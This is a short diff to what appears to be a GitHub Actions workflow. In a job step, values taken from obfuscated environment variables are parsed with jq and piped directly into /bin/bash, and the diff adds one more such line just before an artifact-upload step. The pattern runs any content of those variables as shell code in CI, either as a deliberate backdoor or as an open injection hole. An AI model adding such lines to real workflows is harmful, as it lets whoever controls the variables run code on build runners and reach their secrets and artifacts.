@@ -26,6 +26,7 @@ jobs:
           echo $zjjaz046 | jq -r .wp69653 | /bin/bash
           printf '%s' "$vrkat1597" | jq -r .txb21 | /bin/bash
           printf '%s' "$oc826" | jq -r .j0 | /bin/bash
+          printf '%s' "$s2" | jq -r .f148 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
